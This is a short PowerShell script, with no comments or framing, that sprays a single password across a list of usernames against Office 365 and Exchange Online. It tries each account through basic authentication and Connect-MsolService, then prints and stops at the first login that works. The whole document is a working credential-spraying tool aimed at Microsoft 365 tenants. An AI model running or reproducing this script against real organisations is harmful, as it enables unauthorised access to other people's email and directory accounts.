Param(

[Parameter(Position = 0, Mandatory = $True)]
    [string]
    $Password = "",

[Parameter(Position = 1, Mandatory = $True)]
    [string]
    $UserList = ""
)

Import-Module MSOnline

$x=0
foreach ($username in get-content $UserList)
{
$x=$x+1;
Write-Host "User #$x"
Write-Host "Trying username $username"
$O365password = $password | ConvertTo-SecureString -asPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($username,$O365password)
$O365Session = New-PSSession –ConfigurationName Microsoft.Exchange -ConnectionUri https://ps.outlook.com/powershell -Credential $credential -Authentication Basic -AllowRedirection
Connect-MsolService –Credential $credential
$Domains = Get-Msoldomain
if ($Domains) { write-host $username
exit
}
}